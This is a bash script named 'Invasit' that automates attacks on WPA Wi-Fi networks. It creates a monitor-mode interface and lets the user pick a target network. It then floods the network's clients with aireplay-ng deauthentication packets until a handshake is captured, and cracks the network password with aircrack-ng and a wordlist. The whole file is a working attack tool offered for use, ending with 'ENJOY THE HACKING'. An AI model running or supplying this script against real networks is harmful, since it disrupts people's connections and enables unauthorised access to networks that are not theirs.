#!/bin/bash

# Invasit version 1.2 || by: valvesss

################## SHORTCUTS/STUFFS ##########################

# Deauth time for aireplay-ng
deauthtime=999

# Create auxiliar folders for handshake/password
mkdir -p handshakes
mkdir -p passwords

# This function capture the specific network data
function airodumpscanclients {
	xterm -title "SCANNING $networkname NETWORK " $TOPRIGHTBIG -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name --output-format csv,cap $nic &
}

# This is the function the deauthenticate the clients of the network
function deauthesp {
	xterm -title "DEAUTHENTICATING CLIENTS" $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e aireplay-ng -0 $deauthtime -a $bssidtarget -c $bssidclient --ignore-negative-one $nic &
}

# Capture clients MAC
function getclients {
nr=0
	while [ $nr = 0 ]; do
	cat $name-01.csv | awk 'NR==6,NR==12' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
	nr=$(cat $mac | wc -l)
	done
}

# Kill aircrack-ng family & xterm processes
function killeverybody {
	killall aireplay-ng &>/dev/null
	killall airodump-ng &>/dev/null
	killall xterm &>/dev/null			
}



# Time for most functions
st='0.1'

# Colors for echo
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
WHITE='\033[1;37m'
NC='\033[0m'

# user @ machine # shortchut
userpath="`whoami`@`hostname`:`pwd`#"

# Precautions
trap ctrl_c INT
function ctrl_c () {
	echo -e "${NC}"
	END
}

################# WINDOWS + RESOLUTIONS #####################
## From Fluxion

# Windows + Resolution
function SETRES  {

        function resA {

                TOPLEFT="-geometry 90x13+0+0"
                TOPRIGHT="-geometry 83x26-0+0"
                BOTTOMLEFT="-geometry 90x24+0-0"
                BOTTOMRIGHT="-geometry 75x12-0-0"
                TOPLEFTBIG="-geometry 91x42+0+0"
                TOPRIGHTBIG="-geometry 83x26-0+0"
		CENTER="-geometry 100x30+650+300"
        }

        function resB {

                TOPLEFT="-geometry 92x14+0+0"
                TOPRIGHT="-geometry 68x25-0+0"
                BOTTOMLEFT="-geometry 92x36+0-0"
                BOTTOMRIGHT="-geometry 74x20-0-0"
                TOPLEFTBIG="-geometry 100x52+0+0"
                TOPRIGHTBIG="-geometry 74x30-0+0"
		CENTER="-geometry 100x100+50+50"
        }
        function resC {

                TOPLEFT="-geometry 100x20+0+0"
                TOPRIGHT="-geometry 109x20-0+0"
                BOTTOMLEFT="-geometry 100x30+0-0"
                BOTTOMRIGHT="-geometry 109x20-0-0"
                TOPLEFTBIG="-geometry  100x52+0+0"
                TOPRIGHTBIG="-geometry 109x30-0+0"
		CENTER="-geometry 100x100+50+50"
        }
        function resD {
                TOPLEFT="-geometry 110x35+0+0"
                TOPRIGHT="-geometry 99x40-0+0"
                BOTTOMLEFT="-geometry 110x35+0-0"
                BOTTOMRIGHT="-geometry 99x30-0-0"
                TOPLEFTBIG="-geometry 110x72+0+0"
                TOPRIGHTBIG="-geometry 99x40-0+0"
		CENTER="-geometry 100x100+50+50"

        }
        function resE {
                TOPLEFT="-geometry 130x43+0+0"
                TOPRIGHT="-geometry 68x25-0+0"
                BOTTOMLEFT="-geometry 130x40+0-0"
                BOTTOMRIGHT="-geometry 132x35-0-0"
                TOPLEFTBIG="-geometry 130x85+0+0"
                TOPRIGHTBIG="-geometry 132x48-0+0"
		CENTER="-geometry 100x100+50+50"

        }
        function resF {
                TOPLEFT="-geometry 100x17+0+0"
                TOPRIGHT="-geometry 90x27-0+0"
                BOTTOMLEFT="-geometry 100x30+0-0"
                BOTTOMRIGHT="-geometry 90x20-0-0"
                TOPLEFTBIG="-geometry  100x70+0+0"
                TOPRIGHTBIG="-geometry 90x27-0+0"
		CENTER="-geometry 100x100+50+50"

	}

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
##  A) 1024x600
##  B) 1024x768
##  C) 1280x768
##  D) 1280x1024
##  E) 1600x1200
case $detectedresolution in
        "1024x600" ) resA ;;
        "1024x768" ) resB ;;
        "1280x768" ) resC ;;
        "1366x768" ) resC ;;
        "1280x1024" ) resD ;;
        "1600x1200" ) resE ;;
        "1366x768"  ) resF ;;
                  * ) resA ;;
esac
}

######################### START ##############################

# INTRODUCTION
function INTROD {
clear
echo -e "    ${GREEN}                                                                    ___"
echo -e "   I  NN       N  ${BLUE}V             V  A${NC}         ${GREEN}SSSSSSSS  I  TTTTTTTTT"'    /o o\ '
sleep $st
echo -e "   I  N N      N   ${BLUE}V           V  A A${NC}        ${GREEN}S         I      T"'        \ v / '
sleep $st
echo -e "   I  N  N     N    ${BLUE}V         V  A   A${NC}       ${GREEN}S         I      T"'         |#|  '
sleep $st
echo -e "   I  N   N    N     ${BLUE}V       V  A     A${NC}      ${GREEN}SSSSSSSS  I      T"'         |#|  '
sleep $st
echo -e "   ${YELLOW}I  N    N   N      ${BLUE}V     V  AAAAAAAAA${NC}            ${YELLOW}S  I      T""       __|_|__"
sleep $st
echo -e "   I  N     N  N       ${BLUE}V   V  A         A${NC}           ${YELLOW}S  I      T"'      /=== ===\'
sleep $st
echo -e "   I  N      N N        ${BLUE}V V  A           A${NC}          ${YELLOW}S  I      T"'     /= === ===\'
sleep $st
echo -e "   I  N       NN         ${BLUE}V  A             A${NC}  ${YELLOW}SSSSSSSS  I      T"'     \_________/'${NC}
sleep $st
echo -e "   ${RED}v1.2${NC}"
}

#######################
# 1) Create NIC mon0. #

function MONMOD {

# The name of the virtual nic the will be created

	nic=mon0

# User select the real nic to be used

	read -e -p $'\x0a# 1) Select the network card you want to use [enter for wlan0]: ' nicreal
	
	if [ -z "$nicreal" ] ; then
		nicreal=wlan0
	fi
	
	while ! iwconfig 2>/dev/null | grep -w -q $nicreal 2>/dev/null; do
		read -e -p $'\x0a# Sorry, this network card don\'t exist, try again: ' nicreal
	done


	
# Check if exist the mon0 nic, else, create and activate

	if `iw dev | grep -q $nic`; then
		ifconfig mon0 up 2> /dev/null
	else
		iw dev $nicreal interface add $nic type monitor 2> /dev/null
		ifconfig mon0 up 2> /dev/null
	fi

}

#######################################################################
# 2) Get data bout network AP's and ask user about wich attack. #

function EDTCHN {


# Informations about NetworkManager

	nmcli -f BSSID,CHAN,SIGNAL,SECURITY,SSID dev wifi list > netdata

# Choose network

	echo -e "\n--------------------------------------------------------------"
	nl -v0 netdata | sed 's/^[ \t]*//'
	echo -e "^-------------------------------------------------------------\n"
	read -e -p "# 2) Select the network you want to attack [1,2,3...N]: " num
	
	if [[ $num -eq 0 ]]; then echo "Invalid option, try again"; sleep 2 ; EDTCHN ; fi
	let num=num+1

# Based on users option, get the host: mac, channel and name

	bssidtarget=$(cat netdata | awk -v aux=$num 'NR==aux {print $1}')
	channel=$(cat netdata | awk -v aux=$num 'NR==aux {print $2}')
	networkname=$(cat netdata | awk -v aux=$num 'NR==aux {print $7 $8 $9 $10}')
	name=$networkname"_"$bssidtarget
	rm -rf netdata

# If it found a useful handshake, advance some steps

	if [ -f ./handshakes/$name-handshake.cap ]; then
		echo -e "\n# Handshake for this network found at: #"
		realpath $name-hanshake.cap
		read -e -p $'\x0a# Use it? [y/n]: ' opt
			if [ $opt = "y" ] || [ $opt = "Y" ]; then
				WORLST
			fi	
	fi

# Kill all process the could couse trouble to aircrack family
	
	airmon-ng check kill &> /dev/null &

}

#############################################
# 3) Scan especific network to get clients. #

function ESPSCN {

# Start airodump at the target 

	airodumpscanclients
	mac=$name.lst

# Wait untils csv to be generated

	while [ ! -f $name-01.csv ]; do
		:
	done

	getclients

}

########################################
# 4) Attack network using aireplay-ng. #

function ATTAIR {

	echo -e "\n# 3) Scanning $networkname to get the HANDSHAKE. #"

# Attack clients host until find handshake packet

	aux=1
	while `aircrack-ng $name-01.cap 2>/dev/null | egrep -q '0 handshake|0 packets|No networks' &>/dev/null` ; do
		while [ $aux -le $nr ]; do
			bssidclient=$(awk -v var=$aux 'NR==var' $mac)
			deauthesp
			let aux=aux+1
		done

		getclients
	done

# Clean handshake packet and erase the previous version of .cap

	wpaclean ./handshakes/$name-handshake.cap $name-01.cap &> /dev/null
	rm -rf $name-01.cap

# Finish useless process (xterm, aicrack family)

	killeverybody

# Delete MAC clients table if all right

	rm -rf $mac

}

#################################################
# 5) Search wordlist and verify if don't exist. #

function WORLST {

	read -e -p $'\x0a# 4) Type the wordlist full path: #\x0a'"$userpath " path 

# Verify if the wordlist exist 

	a=0
	while [ $a -eq 0 ]; do
		if [ ! -f $path ]; then
			read -e -p $'\x0a# Wordlist not found, try again: #\x0a'"$userpath " path
		else
			a=1
		fi
	done

}

##################################
# 6) Decryptograph the password. #

function ACRACK {

# Start the wordlist method attack

	aircrack-ng ./handshakes/$name-handshake.cap -w $path | tee $name-passwd.txt

# Get the password name if works

	if `cat $name-passwd.txt | grep -q "KEY FOUND"` ; then
		cat $name-passwd.txt | grep "KEY FOUND" | awk 'NR==1{print $4}' > $name-password.txt
		mv $name-password.txt passwords/
		rm -rf $name-passwd.txt
	else
		rm -rf $name-passwd.txt
	fi

# Notice if sucess or not

	if [ -s ./passwords/$name-password.txt ]; then
		echo -e "\n# Sucess !! The password is: ${RED} `cat ./passwords/$name-password.txt` ${NC} !!! #\n"
	else
		clear
		read -e -p $'\x0a# Sad news but... This wordlist haven\'t the password =/... Try again with a new one? [y/n]: ' opt
		if [ "$opt" = "y" ] || [ "$opt" = "Y" ]; then
			WORLST
		else
			END
		fi			
	fi	

# To prevent that aircrack-ng finish the script by itself

	read -p $'To finish, press ENTER... \x0a'

}

################################################################
# 7) Reinicialize network services and delete the nic created. #

function END {

	# Delete the mon0 virtual interface

	echo -e "\n[+] Deleting network card if created..."

	if iwconfig 2> /dev/null | grep Monitor &>/dev/null; then
		iw dev $nic del &>/dev/null
	fi

	sleep $st

	# Delete the files used in the process (now useless)

	echo "[+] Deleting jerk files if exist..."
	rm -rf $name-01.csv &>/dev/null
	rm -rf $name-01.cap &>/dev/null
	rm -rf $name.lst &>/dev/null
	rm -rf target-0* &>/dev/null
	rm -rf $name-passwd.txt &>/dev/null
	sleep $st

	# Restart the network services by two ways

	echo "[+] Restarting network services..."

	if [ "$nicreal" = "wlan0" ]; then 
		service NetworkManager restart
		service networking restart
	fi

	sleep $st

	# Thanks!

	echo "[+] Thanks for using!"
	sleep $st

# Last logo message

echo -e "\n############################################################"
echo -e "##	${GREEN}ENJOY THE HACKING, ${YELLOW}I N V A S I T ${GREEN}EVERYWHERE${NC}	  ##"
echo "############################################################"

# Finish the script

	exit

}

# Main structure to call all the functions one-by-one
MAIN() {
	SETRES
	INTROD
	MONMOD
	EDTCHN
	ESPSCN
	ATTAIR
	WORLST
	ACRACK
	END
}
MAIN
